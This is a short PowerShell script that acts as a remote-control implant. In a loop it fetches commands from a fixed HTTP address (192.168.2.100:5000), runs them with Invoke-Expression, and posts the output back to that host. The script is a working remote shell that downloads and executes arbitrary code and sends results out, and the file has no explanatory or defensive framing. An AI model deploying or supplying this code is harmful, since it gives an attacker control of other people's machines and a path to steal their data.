$URL = "http://192.168.2.100:5000"
while(1) {
    try {
        $url_cmd = Invoke-WebRequest -URI $URL -ErrorAction Stop | Select-Object -Expand Content
    }
    catch {
        break
    }
    if ($url_cmd.Length -gt 0) {
        $response = Invoke-Expression $url_cmd
        $dontcare = Invoke-WebRequest -URI $URL -Body $response -Method 'POST'
    }
    Start-Sleep -Seconds 2
}
